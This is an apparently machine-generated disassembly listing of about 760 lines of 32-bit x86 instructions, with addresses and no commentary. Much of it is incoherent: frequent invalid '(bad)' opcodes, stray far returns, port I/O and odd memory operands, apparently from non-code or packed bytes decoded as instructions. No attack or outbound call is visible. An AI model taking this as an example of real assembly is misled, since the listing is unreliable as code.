  417899:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4178a0:	xor    ecx,ebx
  4178a2:	retf   
  4178a3:	enter  0x4d03,0xc8
  4178a7:	mov    DWORD PTR fs:[eax],ebx
  4178aa:	lea    eax,[eax]
  4178ac:	push   esp
  4178ad:	mov    edi,edi
  4178af:	fs (bad) 
  4178b1:	(bad)  
  4178b2:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4178b8:	push   0xffffffff
  4178ba:	and    bh,bh
  4178bc:	pop    ecx
  4178bd:	inc    eax
  4178be:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4178c4:	push   0xffffff8b
  4178c6:	pop    ecx
  4178c7:	cld    
  4178c8:	dec    ebp
  4178c9:	lea    ecx,[ecx+0x45ff08ff]
  4178cf:	mov    BYTE PTR [edx+0x1],cl
  4178d2:	add    BYTE PTR [eax],al
  4178d4:	mov    DWORD PTR [ebp+0x8],0x58008d
  4178db:	dec    DWORD PTR [ebp-0x77]
  4178de:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4178e5:	cld    
  4178e6:	dec    ebp
  4178e7:	jne    0x41791c
  4178e9:	lea    eax,[ebx]
  4178eb:	push   eax
  4178ec:	mov    edi,edi
  4178ee:	or     BYTE PTR [ecx+0x54a845],cl
  4178f4:	add    al,ch
  4178f6:	(bad)  
  4178f7:	sub    esp,ebp
  4178f9:	add    BYTE PTR [eax],al
  4178fb:	rol    BYTE PTR [eax],0x84
  4178fe:	inc    ebp
  4178ff:	add    dh,BYTE PTR [esi+0x0]
  417902:	add    BYTE PTR [ebp-0x73],al
  417905:	mov    ebp,DWORD PTR [esp+edx*4]
  417908:	inc    DWORD PTR [eax]
  41790a:	lea    ecx,[ebx-0x30074f4]
  417910:	call   0x428495
  417915:	add    BYTE PTR [ebp+0x0],cl
  417918:	jne    0x41795b
  41791a:	dec    DWORD PTR [ebx-0x76210314]
  417920:	dec    ebp
  417921:	add    DWORD PTR [ebp+0x0],esi
  417924:	(bad)  
  417925:	xchg   ebp,eax
  417926:	loopne 0x417927
  417928:	inc    eax
  417929:	inc    DWORD PTR [eax]
  41792b:	mov    ecx,DWORD PTR [ebp-0x4]
  41792e:	xor    edx,DWORD PTR [edx+0x7201b8]
  417934:	add    BYTE PTR [edx],dl
  417936:	enter  0x4d90,0x0
  41793a:	mov    eax,DWORD PTR [eax]
  41793c:	hlt    
  41793d:	add    al,0xa5
  41793f:	mov    al,0xff
  417941:	add    bh,bh
  417943:	add    BYTE PTR [ebx],dh
  417945:	inc    DWORD PTR [ebx]
  417947:	sbb    al,0x89
  417949:	jne    0x417923
  41794b:	mov    esp,DWORD PTR [ecx+0x4500fc]
  417951:	mov    eax,DWORD PTR [ebp-0xff0048]
  417957:	mov    DWORD PTR [eax-0x70],0xee58ed89
  41795e:	inc    DWORD PTR [ebp-0x75]
  417961:	fisttp QWORD PTR [eax+eiz*8]
  417964:	test   DWORD PTR [esi-0x1],esp
  417967:	inc    ebp
  417968:	(bad)  
  417969:	aas    
  41796a:	inc    ebp
  41796b:	(bad)  
  41796c:	lea    edi,[esp+eiz*2-0x1]
  417970:	inc    edi
  417972:	mov    DWORD PTR ds:0x8000c7a0,edi
  417978:	mov    ebp,esi
  41797a:	cld    
  41797b:	in     al,0x8d
  41797d:	inc    ebp
  41797e:	jmp    eax
  417980:	(bad)  
  417981:	fisttp WORD PTR [eax+0x8801c7]
  417987:	jecxz  0x4179ce
  417989:	out    dx,al
  41798a:	inc    DWORD PTR [ebp-0x4]
  41798d:	out    0x8d,eax
  41798f:	aas    
  417990:	inc    edi
  417992:	jmp    FWORD PTR [eax-0x78]
  417995:	inc    DWORD PTR [ecx]
  417997:	mov    DWORD PTR [eax],0xc7a83d
  41799d:	ins    BYTE PTR es:[edi],dx
  41799e:	test   edi,edi
  4179a0:	pandn  mm0,mm5
  4179a3:	aas    
  4179a4:	add    bh,al
  4179a6:	mov    esi,DWORD PTR [eax-0x4]
  4179a9:	inc    DWORD PTR [eax+0xdf01e0]
  4179af:	(bad)  
  4179b0:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4179b4:	mov    ebp,ebx
  4179b6:	xchg   esp,eax
  4179b7:	fild   DWORD PTR [eax]
  4179b9:	(bad)  
  4179ba:	mov    edi,DWORD PTR [eax+0x3]
  4179bd:	(bad)  
  4179be:	cmp    al,0xe7
  4179c0:	dec    ebp
  4179c1:	leave  
  4179c2:	mov    ebp,eax
  4179c4:	fsubr  DWORD PTR [ecx]
  4179c6:	add    BYTE PTR [eax],al
  4179c8:	lea    ecx,[ebx-0x7f0003b4]
  4179ce:	push   edx
  4179cf:	add    DWORD PTR [ebp+0x0],edx
  4179d2:	mov    esi,DWORD PTR [eax]
  4179d4:	mov    WORD PTR [ebx-0x7a750000],?
  4179da:	add    esi,DWORD PTR [ebp-0x78]
  4179dd:	mov    eax,DWORD PTR [eax]
  4179df:	cld    
  4179e0:	push   0x7d
  4179e2:	dec    DWORD PTR [ebx+0xd88c]
  4179e8:	push   edx
  4179e9:	mov    edx,DWORD PTR [ecx-0x4]
  4179ec:	call   DWORD PTR [eax+0x7d01fc]
  4179f2:	mov    ebx,edx
  4179f4:	cld    
  4179f5:	add    BYTE PTR [eax+0x560150],dl
  4179fb:	test   DWORD PTR [ebp+0x75],eax
  4179fe:	in     al,0x8b
  417a00:	in     al,dx
  417a01:	cld    
  417a02:	(bad)  
  417a03:	jge    0x417999
  417a05:	mov    esp,ebx
  417a07:	fsub   st,st(7)
  417a09:	add    bh,al
  417a0b:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  417a11:	add    edi,edi
  417a13:	add    bh,bh
  417a15:	mov    eax,0x50d800ed
  417a1a:	inc    ebp
  417a1b:	push   esi
  417a1c:	fisttp WORD PTR [ebx+0x4dc7f43f]
  417a22:	test   BYTE PTR [ebx],dh
  417a24:	fadd   DWORD PTR ds:0x4572c2
  417a2a:	jmp    0x4179ed
  417a2c:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  417a33:	inc    esi
  417a34:	jo     0x417a36
  417a36:	test   edi,eax
  417a38:	jmp    esp
  417a3a:	inc    DWORD PTR [eax]
  417a3c:	in     eax,dx
  417a3d:	add    al,bl
  417a3f:	jne    0x4179c6
  417a41:	mov    edi,edi
  417a43:	cld    
  417a44:	inc    DWORD PTR [ebp-0x12]
  417a47:	mov    esp,esp
  417a49:	mov    ah,0x85
  417a4b:	add    bh,bh
  417a4d:	call   0x119a351
  417a52:	ret    0x858b
  417a55:	cld    
  417a56:	inc    DWORD PTR [eax+0xe301ff]
  417a5c:	out    dx,al
  417a5d:	xor    BYTE PTR [ebp-0xff00cf],al
  417a63:	mov    ebx,ebp
  417a65:	cld    
  417a66:	jo     0x4179f1
  417a68:	or     DWORD PTR [ecx],eax
  417a6a:	add    BYTE PTR [eax],al
  417a6c:	push   eax
  417a6d:	add    DWORD PTR [ebp+0x45],eax
  417a70:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  417a76:	dec    DWORD PTR [ebx-0x3fda0318]
  417a7c:	add    BYTE PTR [ebp-0xbf0040],dl
  417a82:	inc    ebp
  417a83:	or     BYTE PTR [ebx-0x4faf0400],0x45
  417a8a:	add    DWORD PTR [ebx+0x459c00],ecx
  417a90:	mov    edi,edi
  417a92:	mov    eax,0xe80800ff
  417a97:	inc    ebp
  417a98:	sub    BYTE PTR [ebx-0x47000400],cl
  417a9e:	add    al,0x1
  417aa0:	rol    BYTE PTR [eax],0x1e
  417aa3:	jne    0x417aea
  417aa5:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  417aab:	inc    DWORD PTR [ecx]
  417aad:	call   0x86a2b2
  417ab2:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  417ab8:	call   0x41a2be
  417abd:	xor    bh,bh
  417abf:	push   edi
  417ac0:	adc    BYTE PTR [ebx-0x747423bb],al
  417ac6:	loopne 0x417aa4
  417ac8:	ret    
  417ac9:	loopne 0x417a67
  417acb:	xor    DWORD PTR [edx],0x31
  417ace:	cmp    edi,edi
  417ad0:	bswap  esp
  417ad2:	rol    BYTE PTR gs:[eax],0x5
  417ad6:	jmp    0x12c7c20
  417adb:	mov    eax,DWORD PTR [ebp-0x4]
  417ade:	add    BYTE PTR [eax+0xff0100],bh
  417ae4:	cld    
  417ae5:	jne    0x417b64
  417ae7:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  417aed:	push   ss
  417aee:	add    DWORD PTR [eax],eax
  417af0:	add    BYTE PTR [eax+0x7f],dl
  417af3:	inc    ebp
  417af4:	add    BYTE PTR [ebx+0x459850],cl
  417afa:	mov    edi,edi
  417afc:	test   al,0xff
  417afe:	add    BYTE PTR [eax],cl
  417b00:	inc    DWORD PTR [ebp-0x18]
  417b03:	jmp    DWORD PTR ds:0x4d7d00dc
  417b09:	adc    BYTE PTR [ebx+0x459cb9],cl
  417b0f:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  417b15:	pushf  
  417b16:	mov    eax,0x30132
  417b1b:	lea    esi,[ebp+0x2c]
  417b1e:	xor    edi,edi
  417b20:	(bad)  
  417b21:	call   0x140a28e
  417b26:	call   0x135a3b6
  417b2b:	jne    0x417ab8
  417b2d:	xor    edi,esp
  417b2f:	add    eax,DWORD PTR [eax+0xc018d]
  417b35:	push   DWORD PTR [eax]
  417b37:	call   0xcaa293
  417b3c:	int3   
  417b3d:	inc    DWORD PTR [ebp-0x14]
  417b40:	mov    ecx,DWORD PTR [ebp-0x28]
  417b43:	xor    eax,DWORD PTR [eax]
  417b45:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  417b4b:	(bad)  
  417b4c:	xchg   ebp,eax
  417b4d:	in     al,0xff
  417b4f:	add    bh,bh
  417b51:	add    BYTE PTR [ebp+0x45],dl
  417b54:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  417b5a:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  417b61:	mov    edi,edi
  417b63:	or     BYTE PTR [eax],cl
  417b65:	inc    ebp
  417b66:	test   DWORD PTR gs:[eax],eax
  417b69:	je     0x417bb0
  417b6b:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  417b71:	xor    edx,DWORD PTR [eax-0x73]
  417b74:	push   ebp
  417b75:	or     BYTE PTR [ebp+0x21007572],al
  417b7b:	inc    ebp
  417b7c:	in     al,dx
  417b7d:	mov    ebp,DWORD PTR [eax]
  417b7f:	mov    esp,0x648bc345
  417b84:	fmul   st,st(5)
  417b86:	add    BYTE PTR [ebx],ch
  417b88:	mov    eax,DWORD PTR [ebx]
  417b8a:	cld    
  417b8b:	loopne 0x417b4d
  417b8d:	inc    ebp
  417b8e:	push   ebp
  417b8f:	cmp    ebp,eax
  417b91:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  417b98:	cld    
  417b99:	fadd   DWORD PTR [eax+0x3b014d]
  417b9f:	jne    0x417bd1
  417ba1:	push   0xf8898557
  417ba6:	in     al,dx
  417ba7:	jne    0x417bee
  417ba9:	lea    eax,[ebx+0x72e8dcc8]
  417baf:	das    
  417bb0:	mov    eax,DWORD PTR [eax]
  417bb2:	mov    esp,0x33eb7545
  417bb7:	mov    edi,DWORD PTR [edi+0x4572bc]
  417bbd:	xor    eax,edi
  417bbf:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  417bc9:	rcl    BYTE PTR [eax-0x40],1
  417bcc:	inc    ebp
  417bcd:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  417bd5:	inc    ebp
  417bd6:	xchg   ebp,eax
  417bd7:	ud0    ebp,DWORD PTR [ebx]
  417bda:	inc    DWORD PTR [eax]
  417bdc:	retf   
  417bdd:	jbe    0x417bdf
  417bdf:	mov    dl,BYTE PTR [eax-0x80]
  417be2:	push   ebp
  417be3:	pop    ds
  417be4:	mov    ecx,DWORD PTR [esp+esi*8]
  417be7:	inc    eax
  417be8:	retf   
  417be9:	inc    ebp
  417bea:	iret   
  417beb:	jb     0x417bb5
  417bed:	mov    eax,DWORD PTR [edi]
  417bef:	enter  0x4545,0x1
  417bf3:	xor    DWORD PTR [eax],eax
  417bf5:	pushf  
  417bf6:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  417bfc:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  417c03:	dec    ebp
  417c04:	add    BYTE PTR [ebx],dh
  417c06:	inc    ebp
  417c07:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  417c0d:	xor    dl,BYTE PTR [edx]
  417c0f:	add    eax,DWORD PTR [ebp-0x77]
  417c12:	mov    eax,esp
  417c14:	fmul   DWORD PTR [ebp-0x3d]
  417c17:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  417c1e:	mov    DWORD PTR [ebp-0x28],eax
  417c21:	rol    DWORD PTR [ebp-0x64],1
  417c24:	xor    eax,edi
  417c26:	mov    ecx,0xff858db0
  417c2b:	clc    
  417c2c:	enter  0x4d45,0x32
  417c30:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  417c37:	test   esi,edi
  417c39:	clc    
  417c3a:	inc    DWORD PTR [ebp+0x45]
  417c3d:	cmp    al,0x8b
  417c3f:	pushf  
  417c40:	or     bh,al
  417c42:	enter  0x16a8,0x85
  417c46:	xor    eax,edi
  417c48:	pushf  
  417c49:	inc    ebp
  417c4a:	(bad)  
  417c4b:	ds cld 
  417c4d:	pushf  
  417c4e:	inc    ebp
  417c4f:	mov    edx,DWORD PTR [eax-0x28]
  417c52:	lock push ebp
  417c54:	add    BYTE PTR [ebx],dh
  417c56:	mov    DWORD PTR [ebx],eax
  417c58:	sar    BYTE PTR [ebx],1
  417c5a:	adc    BYTE PTR [edi],cl
  417c5c:	dec    ebp
  417c5d:	adc    al,0x8b
  417c5f:	add    al,dl
  417c61:	jmp    0x1027e31
  417c66:	jb     0x417cb5
  417c68:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  417c6e:	xor    ecx,DWORD PTR [ebp+0x3b]
  417c71:	xor    ecx,DWORD PTR [edi]
  417c73:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  417c77:	(bad)  
  417c79:	clc    
  417c7a:	enter  0x8400,0x8b
  417c7e:	pop    es
  417c7f:	mov    al,0x0
  417c81:	push   ebp
  417c82:	push   cs
  417c83:	xor    ecx,eax
  417c85:	xor    esp,ecx
  417c87:	add    ebp,DWORD PTR [eax]
  417c89:	add    esi,DWORD PTR [eax]
  417c8b:	(bad)  
  417c8d:	retf   0x55c8
  417c90:	repnz mov eax,DWORD PTR [ebp-0x10]
  417c94:	(bad)  
  417c95:	cli    
  417c96:	fdivr  st,st(1)
  417c98:	test   DWORD PTR [eax+edi*8],ecx
  417c9b:	dec    ebp
  417c9c:	inc    ebp
  417c9d:	xor    edi,DWORD PTR [eax-0x7167afd]
  417ca3:	add    BYTE PTR [ebp+0x0],al
  417ca6:	mov    ecx,DWORD PTR [ebp-0x28]
  417ca9:	mov    ecx,ebx
  417cab:	clc    
  417cac:	jne    0x417c79
  417cae:	mov    esi,0xd672d3
  417cb3:	into   
  417cb4:	into   
  417cb5:	scas   eax,DWORD PTR es:[edi]
  417cb6:	dec    ebp
  417cb7:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  417cbd:	sub    ecx,esi
  417cbf:	cmp    ecx,DWORD PTR [ebp+0x77]
  417cc2:	(bad)  
  417cc3:	mov    edi,eax
  417cc5:	mov    al,0x85
  417cc7:	mov    eax,edi
  417cc9:	add    BYTE PTR [ebp-0x75],al
  417ccc:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  417cd3:	xor    eax,DWORD PTR [ebp+0x4503f803]
  417cd9:	(bad)  
  417cdb:	retf   0x559c
  417cde:	(bad)  
  417cdf:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  417ce6:	inc    ebp
  417ce7:	add    eax,0xeb9c4d3f
  417cec:	(bad)  
  417ced:	mov    ecx,esp
  417cef:	lods   al,BYTE PTR ds:[esi]
  417cf0:	test   DWORD PTR [ebp-0x8],edx
  417cf3:	xor    ecx,DWORD PTR [ebp+0x33]
  417cf6:	mov    eax,DWORD PTR [ebx]
  417cf8:	lock add ecx,ebx
  417cfb:	bswap  esi
  417cfd:	retf   0x55d1
  417d00:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  417d06:	jmp    0x417d01
  417d08:	add    BYTE PTR ds:0xebc44d8b,al
  417d0e:	push   ebp
  417d0f:	mov    ebp,DWORD PTR [ebx]
  417d11:	test   al,0x8b
  417d13:	push   ebp
  417d14:	clc    
  417d15:	xor    ecx,ebx
  417d17:	xor    ecx,esi
  417d19:	add    edx,ecx
  417d1b:	add    eax,DWORD PTR [edx+0xca010f]
  417d21:	push   ebp
  417d22:	dec    ebp
  417d23:	mov    ecx,DWORD PTR [ebx-0x34050710]
  417d29:	stc    
  417d2a:	rol    DWORD PTR ds:0xebce4dd6,cl
  417d30:	scas   eax,DWORD PTR es:[edi]
  417d31:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  417d37:	xor    ebp,DWORD PTR [ebx]
  417d39:	xor    edi,DWORD PTR [ebx]
  417d3b:	add    esi,DWORD PTR [edi+0x3]
  417d3e:	mov    ecx,DWORD PTR [edi]
  417d40:	clc    
  417d41:	retf   0x55cb
  417d44:	into   
  417d45:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  417d4c:	mov    eax,0x3376554d
  417d51:	mov    esi,DWORD PTR [ebx]
  417d53:	int3   
  417d54:	add    edx,DWORD PTR [ebp+0x3]
  417d57:	xor    ecx,DWORD PTR [edi]
  417d59:	xor    ecx,edx
  417d5b:	add    edx,DWORD PTR [ebp+0x3]
  417d5e:	mov    ecx,DWORD PTR [edi]
  417d60:	lock retf 0x4dfa
  417d64:	stc    
  417d65:	mov    ecx,DWORD PTR [eax]
  417d67:	or     BYTE PTR [ebp+0x4d],cl
  417d6a:	jmp    0x1057dfa
  417d6f:	dec    ebp
  417d70:	dec    ebp
  417d71:	(bad)  
  417d72:	mov    ebx,esp
  417d74:	clc    
  417d75:	test   ebx,ecx
  417d77:	clc    
  417d78:	ror    DWORD PTR [ebp-0x2a],cl
  417d7b:	mov    esi,ecx
  417d7d:	call   0x33ccc331
  417d82:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  417d89:	retf   
  417d8a:	ja     0x417d5a
  417d8c:	mov    ebp,DWORD PTR [eax-0x48]
  417d8f:	dec    ebp
  417d90:	xor    ecx,DWORD PTR [di+0x3]
  417d94:	mov    esp,esp
  417d96:	clc    
  417d97:	push   ebp
  417d98:	retf   
  417d99:	mov    dl,bl
  417d9b:	adc    esi,edx
  417d9d:	jb     0x417d6d
  417d9f:	add    BYTE PTR [edi-0x3b7474b3],ch
  417da5:	call   0x4d6d4927
  417daa:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  417db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417db1:	pushf  
  417db2:	inc    ebp
  417db3:	xor    cl,BYTE PTR [ebp-0x78]
  417db6:	mov    edx,edi
  417db8:	clc    
  417db9:	dec    ebp
  417dba:	retf   
  417dbb:	mov    edx,ebx
  417dbd:	call   0x56105198
  417dc2:	scas   eax,DWORD PTR es:[edi]
  417dc3:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  417dc9:	pushf  
  417dca:	sub    esi,DWORD PTR [edx]
  417dcc:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  417dd2:	lods   al,BYTE PTR ds:[esi]
  417dd3:	xor    esp,DWORD PTR [ebx]
  417dd5:	add    ecx,DWORD PTR [ebp-0x1c]
  417dd8:	mov    edi,DWORD PTR [ebp-0x8]
  417ddb:	mov    bl,cl
  417ddd:	cmp    dl,bl
  417ddf:	jb     0x417daf
  417de1:	add    dh,dl
  417de3:	dec    ebp
  417de4:	scas   eax,DWORD PTR es:[edi]
  417de5:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  417deb:	shr    DWORD PTR [ebx],cl
  417ded:	into   
  417dee:	cmp    edx,esi
  417df0:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  417df6:	dec    ebp
  417df7:	dec    ebp
  417df8:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  417dfe:	retf   
  417dff:	xor    edx,esi
  417e01:	add    ecx,esi
  417e03:	imul   ecx,edx
  417e06:	mov    DWORD PTR [ebp+0x8],edx
  417e09:	xor    ecx,DWORD PTR [ebp+0x2b]
  417e0c:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  417e12:	add    esi,DWORD PTR [ebx]
  417e14:	mov    ah,0x3
  417e16:	inc    ebp
  417e17:	rdtsc  
  417e19:	xlat   BYTE PTR ds:[ebx]
  417e1a:	pushf  
  417e1b:	jge    0x417da6
  417e1d:	xor    ebx,eax
  417e1f:	sub    eax,DWORD PTR [ebp-0x73]
  417e22:	(bad)  
  417e23:	cmp    al,al
  417e25:	jb     0x417dac
  417e27:	add    al,bh
  417e29:	ror    DWORD PTR [ebp-0x7a],1
  417e2c:	xor    edi,edi
  417e2e:	add    edi,edi
  417e30:	jmp    0x417e7f
  417e32:	mov    ecx,DWORD PTR [ebx-0x34341324]
  417e38:	dec    ebp
  417e39:	into   
  417e3a:	mov    ebp,DWORD PTR [edi-0x23737428]
  417e40:	pushf  
  417e41:	shl    DWORD PTR [edx],cl
  417e43:	retf   0x5588
  417e46:	or     ecx,DWORD PTR [ebp+0x7233114d]
  417e4c:	add    eax,DWORD PTR [eax]
  417e4e:	in     al,0x4d
  417e50:	push   ebp
  417e51:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  417e57:	fs add ch,cl
  417e5a:	dec    ebp
  417e5b:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  417e61:	dec    ebp
  417e62:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  417e68:	jge    0x417e38
  417e6a:	mov    BYTE PTR [edi+0xf723b3a],ch
  417e70:	add    cl,dh
  417e72:	dec    ebp
  417e73:	dec    DWORD PTR [ebx-0x2c032375]
  417e79:	adc    BYTE PTR [ebp+0x1],0x8b
  417e7d:	add    al,bl
  417e7f:	jge    0x417e0d
  417e81:	push   0xffffff9c
  417e83:	push   0x8b3032
  417e88:	shl    BYTE PTR [ebp+0x55],0x6a
  417e8c:	xor    edi,edi
  417e8e:	xor    edx,DWORD PTR [ebx+eax*1]
  417e91:	inc    ebp
  417e92:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  417e98:	dec    ebp
  417e99:	or     BYTE PTR [ecx+0x4dc8e483],cl
  417e9f:	jbe    0x417e2c
  417ea1:	mov    ebp,esp
  417ea3:	ror    bl,1
  417ea5:	enter  0x14ce,0xaf
  417ea9:	dec    DWORD PTR [ebx-0x2cef17f8]
  417eaf:	push   ebp
  417eb0:	retf   0x5540
  417eb3:	push   ebp
  417eb4:	mov    esi,DWORD PTR [edx-0x1c]
  417eb7:	mov    edx,ebx
  417eb9:	cld    
  417eba:	(bad)  
  417ebb:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  417ec2:	sti    
  417ec3:	add    dh,cl
  417ec5:	push   0xffffff94
  417ec7:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  417ece:	bswap  esp
  417ed0:	pop    esi
  417ed1:	inc    ebp
  417ed2:	dec    DWORD PTR [ecx+0x45e8c88b]
  417ed8:	push   ebp
  417ed9:	xor    esi,DWORD PTR [ebx]
  417edb:	mov    DWORD PTR [ebx],0xcac00f9c
  417ee1:	aas    
  417ee2:	push   ebp
  417ee3:	inc    ebp
  417ee4:	xor    ecx,eax
  417ee6:	add    ecx,eax
  417ee8:	mov    eax,DWORD PTR [ebx]
  417eea:	(bad)  
  417eeb:	jmp    0x417e79
  417eed:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  417ef4:	les    edi,FWORD PTR [esi-0xeccefb3]
  417efa:	mov    edx,0xff378d80
  417eff:	mov    dh,0xd1
  417f01:	cmp    edx,DWORD PTR [ebp+0xf]
  417f04:	mov    eax,DWORD PTR [edx-0x20]
  417f07:	add    BYTE PTR [ebp-0x75],bh
  417f0a:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  417f11:	pushf  
  417f12:	retf   0x8632
  417f15:	cmp    ebp,0x8
  417f18:	call   ebx
  417f1a:	inc    ebp
  417f1b:	inc    ebp
  417f1c:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  417f22:	mov    esi,DWORD PTR [ecx]
  417f24:	enter  0x49c,0xc7
  417f28:	add    al,al
  417f2a:	add    bl,al
  417f2c:	(bad)  
  417f2d:	clc    
  417f2e:	enter  0x45,0x31
  417f32:	push   eax
  417f33:	pushf  
  417f34:	mov    edi,eax
  417f36:	int3   
  417f37:	or     al,al
  417f39:	test   DWORD PTR [edi],edi
  417f3b:	clc    
  417f3c:	gs inc ebp
  417f3e:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  417f44:	push   ss
  417f45:	xor    ecx,DWORD PTR [ebp+0x3]
  417f48:	sub    edx,DWORD PTR [ecx-0x76]
  417f4b:	dec    ebp
  417f4c:	add    DWORD PTR [ebx+0x88d845],ecx
  417f52:	mov    esi,DWORD PTR [ebx]
  417f54:	or     BYTE PTR [ebx],al
  417f56:	cmp    edx,DWORD PTR [ecx-0x38]
  417f59:	dec    ebp
  417f5a:	out    dx,eax
  417f5b:	xor    eax,DWORD PTR [ebp+0x3]
  417f5e:	mov    edx,DWORD PTR [ecx-0x28]
  417f61:	dec    ebp
  417f62:	add    BYTE PTR [ebx],dh
  417f64:	push   0x518003
  417f69:	push   eax
  417f6a:	add    BYTE PTR [ebx-0x300748b],cl
  417f70:	sbb    BYTE PTR [ebp+0x45],cl
  417f73:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  417f79:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  417f7f:	dec    ebp
  417f80:	inc    ebp
  417f81:	xor    ecx,eax
  417f83:	add    ecx,eax
  417f85:	push   ecx
  417f86:	(bad)  
  417f87:	dec    ebp
  417f88:	mov    al,ds:0xc5e03dff
  417f8d:	retf   
  417f8e:	(bad)  
  417f8f:	into   
  417f90:	sub    bh,bh
  417f92:	dec    esp
  417f93:	adc    al,0x9c
  417f95:	inc    ebp
  417f96:	push   ebp
  417f97:	test   DWORD PTR [edi],ecx
  417f99:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab8ff80]
  417fa0:	jmp    0xc9ba8eb4
  417fa5:	add    cl,dl
  417fa7:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  417fb1:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  417fb7:	rol    BYTE PTR [eax],0x55
  417fba:	clc    
  417fbb:	fs jb  0x417fc5
  417fbe:	mov    eax,DWORD PTR [ebp-0x30]
  417fc1:	xor    al,0x40
  417fc3:	sub    al,0xc7
  417fc5:	mov    ah,ch
  417fc7:	add    DWORD PTR [ebp+0x4534f845],eax
  417fcd:	sub    al,0x86
  417fcf:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  417fd6:	mov    ch,0xff
  417fd8:	clc    
  417fd9:	add    DWORD PTR [ebp+0x60],0x3d
  417fdd:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  417fe4:	inc    ebp
  417fe5:	dec    DWORD PTR [ebx-0x341ff701]
  417feb:	test   esi,ecx
  417fed:	dec    DWORD PTR [ebx-0x7f8a3301]
  417ff3:	push   eax
  417ff4:	add    DWORD PTR [ebp+0x0],eax
  417ff7:	dec    ebx
  417ff9:	or     al,0xce
  417ffb:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  418002:	into   
  418003:	add    BYTE PTR [ebx-0x34ff1400],cl
  418009:	mov    esi,ecx
  41800b:	sar    bh,0x45
  41800e:	adc    al,0x8b
  418010:	clc    
  418011:	fadd   DWORD PTR [ebp+0x0]
  418014:	mov    ebp,DWORD PTR [edx+0x8]
  418017:	push   edi
  418018:	adc    BYTE PTR [eax+0x1],0x83
  41801c:	add    al,al
  41801e:	retf   
  41801f:	mov    ecx,esi
  418021:	cld    
  418022:	mov    eax,DWORD PTR [eax+0xcb01cc]
  418028:	into   
  418029:	add    BYTE PTR [ebx+0x756aec00],cl
  41802f:	jne    0x418064
  418031:	inc    DWORD PTR [ebx]
  418033:	rcl    BYTE PTR [ecx+0x50],1
  418036:	push   eax
  418037:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  41803d:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  418044:	sar    bh,0x84
  418047:	or     BYTE PTR [ebx],al
  418049:	push   eax
  41804a:	add    BYTE PTR [ebx+0x4532c845],cl
  418050:	pushf  
  418051:	xor    edi,eax
  418053:	pushf  
  418054:	mov    ah,0x89
  418056:	test   eax,ebp
  418058:	clc    
  418059:	inc    ebp
  41805a:	inc    ebp
  41805b:	mov    DWORD PTR [eax+eax*8],esi
  41805e:	sub    al,0x30
  418060:	mov    BYTE PTR [ebx+ecx*4+0x55d8ec89],bl
  418067:	dec    ebp
  418068:	xor    eax,DWORD PTR fs:[edi+0x3]
  41806c:	mov    ecx,DWORD PTR [ecx+0x4d55f4b4]
  418072:	xor    eax,DWORD PTR fs:[edi+0x3]
  418076:	or     DWORD PTR [ecx+0x45ff085c],0x0
  41807d:	shl    DWORD PTR [ebp-0x380064],1
  418083:	int3   
  418084:	lea    eax,[ebp+0x45fff860]
  41808a:	push   eax
  41808b:	xor    dh,BYTE PTR [ebp-0x64]
  41808e:	(bad)  
  41808f:	(bad)  
  418090:	pop    esp
  418091:	lods   al,BYTE PTR ds:[esi]
